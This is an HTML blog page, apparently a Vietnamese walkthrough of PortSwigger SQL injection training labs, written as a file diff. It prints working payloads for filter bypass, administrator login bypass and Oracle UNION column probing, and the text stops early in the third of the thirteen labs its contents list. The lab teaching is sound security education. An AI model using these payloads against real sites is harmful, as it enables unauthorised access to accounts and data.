@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>PortSwigger - SQL Injection - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/">
+  <meta property="og:site_name" content="g03m0n">
+  <meta property="og:title" content="PortSwigger - SQL Injection">
+  <meta property="og:description" content="1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Link lab tại đâyLevel: APPRENTICE
+Description Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
+SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1 Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-01-20T08:29:01+08:00">
+    <meta property="article:modified_time" content="2024-01-20T08:29:01+08:00">
+    <meta property="article:tag" content="Portswigger">
+    <meta property="article:tag" content="Lab">
+    <meta property="article:tag" content="Ctf">
+    <meta property="og:image" content="https://g03m0n.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://g03m0n.github.io/logo.png">
+  <meta name="twitter:title" content="PortSwigger - SQL Injection">
+  <meta name="twitter:description" content="1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Link lab tại đâyLevel: APPRENTICE
+Description Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
+SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1 Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.">
+<meta name="application-name" content="g03m0n">
+<meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/" /><link rel="prev" href="https://g03m0n.github.io/posts/cookiectf---baby-crawler/" /><link rel="next" href="https://g03m0n.github.io/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PortSwigger - SQL Injection",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/g03m0n.github.io\/posts\/portswigger---sqli\/portswigger---sqli\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "portswigger, lab, ctf","wordcount":  1379 ,
+        "url": "https:\/\/g03m0n.github.io\/posts\/portswigger---sqli\/portswigger---sqli\/","datePublished": "2024-01-20T08:29:01+08:00","dateModified": "2024-01-20T08:29:01+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "g03m0n"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PortSwigger - SQL Injection</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/portswigger/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>PortSwigger</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-20">2024-01-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1379 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#step">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-sql-injection-vulnerability-allowing-login-bypass">2. SQL injection vulnerability allowing login bypass</a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#step-1">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle">3. SQL injection attack, querying the database type and version on Oracle</a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#step-2">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">4. SQL injection attack, querying the database type and version on MySQL and Microsoft</a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#step-3">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">5. SQL injection attack, listing the database contents on non-Oracle databases</a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#step-4">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-sql-injection-attack-listing-the-database-contents-on-oracle">6. SQL injection attack, listing the database contents on Oracle</a>
+      <ul>
+        <li><a href="#description-5">Description</a></li>
+        <li><a href="#step-5">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">7. SQL injection UNION attack, determining the number of columns returned by the query</a>
+      <ul>
+        <li><a href="#description-6">Description</a></li>
+        <li><a href="#step-6">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-sql-injection-union-attack-finding-a-column-containing-text">8. SQL injection UNION attack, finding a column containing text</a>
+      <ul>
+        <li><a href="#description-7">Description</a></li>
+        <li><a href="#step-7">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#9-sql-injection-union-attack-retrieving-data-from-other-tables">9. SQL injection UNION attack, retrieving data from other tables</a>
+      <ul>
+        <li><a href="#description-8">Description</a></li>
+        <li><a href="#step-8">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#10-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">10. SQL injection UNION attack, retrieving multiple values in a single column</a>
+      <ul>
+        <li><a href="#description-9">Description</a></li>
+        <li><a href="#step-9">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#11-blind-sql-injection-with-conditional-responses">11. Blind SQL injection with conditional responses</a>
+      <ul>
+        <li><a href="#description-10">Description</a></li>
+        <li><a href="#step-10">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#12-blind-sql-injection-with-conditional-errors">12. Blind SQL injection with conditional errors</a>
+      <ul>
+        <li><a href="#description-11">Description</a></li>
+        <li><a href="#step-11">Step</a></li>
+      </ul>
+    </li>
+    <li><a href="#13">13.</a>
+      <ul>
+        <li><a href="#description-12">Description</a></li>
+        <li><a href="#step-12">Step</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description">Description</h3>
+<p>Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Gifts&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.</p>
+<h3 id="step">Step</h3>
+<p>Đầu tiên click vào một category bất kỳ
+Sau khi nhấp vào <code>Accessories</code> category, URL hiển thị:</p>
+<pre tabindex="0"><code>https://0a8000e303dd05e481ca2ff0002600bb.web-security-academy.net/filter?category=Accessories
+</code></pre><p>Để ý những từ in đậm là chuỗi truy vấn.
+Ứng dụng sẽ thực hiện một truy vấn SQL để lấy thông tin từ cơ sở dữ liệu.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Mục tiêu là lấy tất cả thông tin sản phẩm, từ tất cả danh mục và cả sản phẩm đã phát hành và chưa phát hành.
+Câu lệnh trên hiển thị <code>released = 1</code> nghĩa là nó sẽ chỉ hiển thị các sản phẩm đã được phát hành, trong đó <code>released = 0</code> đại diện cho các sản phẩm chưa được phát hành.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/b7e609f3-7cce-41e3-9ab9-369ad27412c6"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/b7e609f3-7cce-41e3-9ab9-369ad27412c6, https://github.com/g03m0n/pics/assets/130943529/b7e609f3-7cce-41e3-9ab9-369ad27412c6 1.5x, https://github.com/g03m0n/pics/assets/130943529/b7e609f3-7cce-41e3-9ab9-369ad27412c6 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/b7e609f3-7cce-41e3-9ab9-369ad27412c6"
+        title="image" /></p>
+<p>Tiếp theo nếu thêm một dấu <code>'</code> vào cuối chuỗi truy vấn</p>
+<p><code>?category=Accessories'</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Điều này sẽ gây ra lỗi vì có một dấu <code>'</code> chưa được đóng.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/56dafa3c-50ff-4076-baf0-2c3682dfddf0"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/56dafa3c-50ff-4076-baf0-2c3682dfddf0, https://github.com/g03m0n/pics/assets/130943529/56dafa3c-50ff-4076-baf0-2c3682dfddf0 1.5x, https://github.com/g03m0n/pics/assets/130943529/56dafa3c-50ff-4076-baf0-2c3682dfddf0 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/56dafa3c-50ff-4076-baf0-2c3682dfddf0"
+        title="image" /></p>
+<p>Tiếp theo, thêm 2 dấu gạch ngang:</p>
+<p><code>?category=Accessories' --</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Trong MySQL, mọi thứ sau dấu <code>--</code> sẽ được coi là <code>comment</code>.
+Có nghĩa là bây giờ trang web sẽ hiển thị tất cả các sản phẩm thuộc danh mục <code>Accessories</code>, cả <code>released</code> và <code>unreleased</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/6499966e-e862-419e-8689-93fa508ff06c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/6499966e-e862-419e-8689-93fa508ff06c, https://github.com/g03m0n/pics/assets/130943529/6499966e-e862-419e-8689-93fa508ff06c 1.5x, https://github.com/g03m0n/pics/assets/130943529/6499966e-e862-419e-8689-93fa508ff06c 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/6499966e-e862-419e-8689-93fa508ff06c"
+        title="image" /></p>
+<p>Để hiển thị đầy đủ mọi thứ trong cơ sở dữ liệu:</p>
+<p><code>?category=Acesssories' or '1'='1' --'</code></p>
+<p>Chuỗi truy vấn lúc này sẽ là:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Với truy vấn trên, nó sẽ trả về tất cả các sản phẩm khi <code>Category</code> là <code>Accessories</code> hoặc <code>1 = 1</code> , vì <code>1 = 1</code> luôn đúng nên nó sẽ trả về tất cả các sản phẩm.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/a540c637-2585-4e7a-bd14-23f446bf1950"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a540c637-2585-4e7a-bd14-23f446bf1950, https://github.com/g03m0n/pics/assets/130943529/a540c637-2585-4e7a-bd14-23f446bf1950 1.5x, https://github.com/g03m0n/pics/assets/130943529/a540c637-2585-4e7a-bd14-23f446bf1950 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/a540c637-2585-4e7a-bd14-23f446bf1950"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/aebe931f-19d4-4aa1-b3e9-d72fd4319c5d"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/aebe931f-19d4-4aa1-b3e9-d72fd4319c5d, https://github.com/g03m0n/pics/assets/130943529/aebe931f-19d4-4aa1-b3e9-d72fd4319c5d 1.5x, https://github.com/g03m0n/pics/assets/130943529/aebe931f-19d4-4aa1-b3e9-d72fd4319c5d 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/aebe931f-19d4-4aa1-b3e9-d72fd4319c5d"
+        title="image" /></p>
+<h2 id="2-sql-injection-vulnerability-allowing-login-bypass">2. SQL injection vulnerability allowing login bypass</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-1">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong chức năng đăng nhập.</p>
+<p>Để giải quyết bài lab, thực hiện một cuộc tấn công SQLi để đăng nhập vào ứng dụng với tư cách là <code>administrator</code>.</p>
+<h3 id="step-1">Step</h3>
+<p>Đầu tiên ấn vào <code>My account</code> để vào giao diện <code>login</code>
+Thử đăng nhập với tài khoản <code>administrator</code> và mật khẩu bất kỳ.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/bf922b41-21d9-4213-b112-5e8d3c008d6c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/bf922b41-21d9-4213-b112-5e8d3c008d6c, https://github.com/g03m0n/pics/assets/130943529/bf922b41-21d9-4213-b112-5e8d3c008d6c 1.5x, https://github.com/g03m0n/pics/assets/130943529/bf922b41-21d9-4213-b112-5e8d3c008d6c 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/bf922b41-21d9-4213-b112-5e8d3c008d6c"
+        title="image" /></p>
+<p>Khi đăng nhập, câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
+</span></span></code></pre></div><p>Tiếp theo ta thử thêm 1 dấu <code>'</code> vào cuối <code>administrator</code> và đăng nhập.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/52274f60-bc36-4405-8774-a2da5809099c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/52274f60-bc36-4405-8774-a2da5809099c, https://github.com/g03m0n/pics/assets/130943529/52274f60-bc36-4405-8774-a2da5809099c 1.5x, https://github.com/g03m0n/pics/assets/130943529/52274f60-bc36-4405-8774-a2da5809099c 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/52274f60-bc36-4405-8774-a2da5809099c"
+        title="image" /></p>
+<p>Server sẽ bị lỗi, điều này cho thấy server bị lỗi SQL Injection.
+Nếu ta tiêm vào <code>username</code> câu lệnh: <code>administrator' or '1' = '1' --</code>
+Câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">--</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Bất kể mật khảu của tài khoản <code>administrator</code> có đúng hay không, vì <code>1 = 1</code> sẽ luôn trả về <code>true</code> và dấu <code>--</code> sẽ <code>comment</code> phần còn lại của câu lệnh <code>' AND password = 'password'</code> nên nó sẽ đăng nhập vào tài khoản <code>administrator</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/7bc23f05-12c8-4014-b771-189ef7696b32"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/7bc23f05-12c8-4014-b771-189ef7696b32, https://github.com/g03m0n/pics/assets/130943529/7bc23f05-12c8-4014-b771-189ef7696b32 1.5x, https://github.com/g03m0n/pics/assets/130943529/7bc23f05-12c8-4014-b771-189ef7696b32 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/7bc23f05-12c8-4014-b771-189ef7696b32"
+        title="image" /></p>
+<p>Đăng nhập thành công.
+Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/74fe5a4d-65f7-4d1d-89c6-504f56906344"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/74fe5a4d-65f7-4d1d-89c6-504f56906344, https://github.com/g03m0n/pics/assets/130943529/74fe5a4d-65f7-4d1d-89c6-504f56906344 1.5x, https://github.com/g03m0n/pics/assets/130943529/74fe5a4d-65f7-4d1d-89c6-504f56906344 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/74fe5a4d-65f7-4d1d-89c6-504f56906344"
+        title="image" /></p>
+<h2 id="3-sql-injection-attack-querying-the-database-type-and-version-on-oracle">3. SQL injection attack, querying the database type and version on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-2">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-2">Step</h3>
+<p>Trong Oracle, built-in table có tên là <code>dual</code>, do vậy, ta có thể dò cột bằng cách sử dụng <code>UNION SELECT</code> và gọi <code>FROM</code> đến bảng <code>dual</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Lặp đi lặp lại câu lệnh, mỗi lần tăng số lượng <code>null</code>.
+Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <code>' UNION (select null, null)--</code>.</p>
